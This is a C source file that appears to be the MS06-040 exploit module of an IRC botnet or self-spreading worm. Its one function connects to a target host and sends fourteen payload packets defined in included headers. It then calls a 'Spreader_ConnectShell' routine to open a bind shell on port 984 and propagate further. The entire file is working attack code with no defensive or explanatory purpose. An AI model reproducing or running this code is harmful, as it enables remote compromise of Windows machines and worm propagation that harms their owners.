
//headers/ms06-40-w2k.h"
#include "ms06-40-wXP.h"

#pragma comment(lib, "ws2_32.lib")

void ms0640(exparam_s exparam)
{
	//int sock;
	int con;
	int repbf[20000];
	//char sendbuf[IRCLINE];
	SOCKET				sock;
	struct sockaddr_in	server;
	char				buffer[4626];
	int					i;

	

	WSADATA wsaData;
	if(WSAStartup(0x0101,&wsaData) != 0)
	{
		return;
	}

	/*int OS=FpHost(exinfo.ip, FP_RPC);
	if(OS==OS_UNKNOWN) OS=FpHost(exinfo.ip, FP_SMB);
	if(OS==OS_UNKNOWN) return FALSE;*/



	server.sin_family = AF_INET;
	server.sin_addr.s_addr = exparam.ip; 
    server.sin_port = htons(exparam.port); 

	if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) 
		return;

	if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) 
	{
		closesocket(sock); 
		return;
	}
	/*if(con < 0)
	{
		return FALSE;
	}*/
	



		send(sock,winXP0640_0,sizeof(winXP0640_0),0);
		recv(sock,(char *)repbf,sizeof(repbf),0);

		send(sock,winXP0640_1,sizeof(winXP0640_1),0);
		recv(sock,(char *)repbf,sizeof(repbf),0);

		send(sock,winXP0640_2,sizeof(winXP0640_2),0);
		recv(sock,(char *)repbf,sizeof(repbf),0);

		send(sock,winXP0640_3,sizeof(winXP0640_3),0);
		recv(sock,(char *)repbf,sizeof(repbf),0);

		send(sock,winXP0640_4,sizeof(winXP0640_4),0);
		recv(sock,(char *)repbf,sizeof(repbf),0);

		send(sock,winXP0640_5,sizeof(winXP0640_5),0);
		recv(sock,(char *)repbf,sizeof(repbf),0);

		send(sock,winXP0640_6,sizeof(winXP0640_6),0);
		recv(sock,(char *)repbf,sizeof(repbf),0);

		send(sock,winXP0640_7,sizeof(winXP0640_7),0);
		recv(sock,(char *)repbf,sizeof(repbf),0);

		send(sock,winXP0640_8,sizeof(winXP0640_8),0);
		recv(sock,(char *)repbf,sizeof(repbf),0);

		send(sock,winXP0640_9,sizeof(winXP0640_9),0);
		recv(sock,(char *)repbf,sizeof(repbf),0);

		send(sock,winXP0640_10,sizeof(winXP0640_10),0);
		recv(sock,(char *)repbf,sizeof(repbf),0);

		send(sock,winXP0640_11,sizeof(winXP0640_11),0);
		recv(sock,(char *)repbf,sizeof(repbf),0);

		send(sock,winXP0640_12,sizeof(winXP0640_12),0);
		recv(sock,(char *)repbf,sizeof(repbf),0);
		
		send(sock,winXP0640_13,sizeof(winXP0640_13),0);
//	}

	recv(sock,(char *)repbf,sizeof(repbf),0);

	closesocket(sock);

	Sleep(2000);
Spreader_ConnectShell(exparam, 984);
	
	

}



